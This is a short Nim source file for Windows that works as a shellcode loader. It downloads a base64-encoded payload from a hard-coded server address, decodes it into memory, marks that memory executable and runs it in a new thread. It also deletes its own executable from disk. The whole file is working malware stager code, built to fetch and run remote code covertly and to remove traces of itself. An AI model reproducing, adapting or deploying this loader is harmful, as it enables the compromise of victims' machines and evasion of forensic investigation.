#[
  nim c -d:release -d:danger --threads:off --opt:size -d:noRes --passC:"-s" --passC:"-flto" --passL:"-flto" .\main.nim
]#
import winim 
import std/[base64, httpclient]
import selfdelete

## url of server that is holding our payload
const URL = "http://192.168.125.151/payload"

proc retrievePayload(): string =
  var client = newHttpClient()
  try:
    result = client.getContent(URL)
  finally:
    client.close()

proc setupPayload(payload: string): LPVOID =
  var 
    p = decode(payload)
    dec = p.cstring
  var buf = VirtualAlloc(
    nil, cast[SIZE_T](p.len),
    MEM_COMMIT or MEM_RESERVE,
    PAGE_READWRITE
  ) # allocate buffer for payload
  copyMem(buf, addr dec[0], p.len) # move decoded payload into buffer
  var oldProtect: DWORD
  VirtualProtect(buf, p.len, PAGE_EXECUTE_READ, addr oldProtect)
  return buf


proc executePayload(payload: LPVOID) = 
  var handle = CreateThread(
    cast[LPSECURITY_ATTRIBUTES](nil),
    cast[SIZE_T](nil),
    cast[LPTHREAD_START_ROUTINE](payload),
    cast[LPVOID](nil),
    cast[DWORD](nil),
    cast[LPDWORD](nil)
  ) # create thread and execute payload
  WaitForSingleObject(handle, INFINITE)
  # cannot free the payload because of crash
  # VirtualFree(cast[LPVOID](payload), 0.SIZE_T, MEM_RELEASE) # free payload

proc main() =
  var 
    payload = retrievePayload()
    readyPayload = setupPayload(payload)
  if cast[int](readyPayload) == 0:
    quit()
  discard deleteSelf()
  executePayload(readyPayload)

when isMainModule:
  main()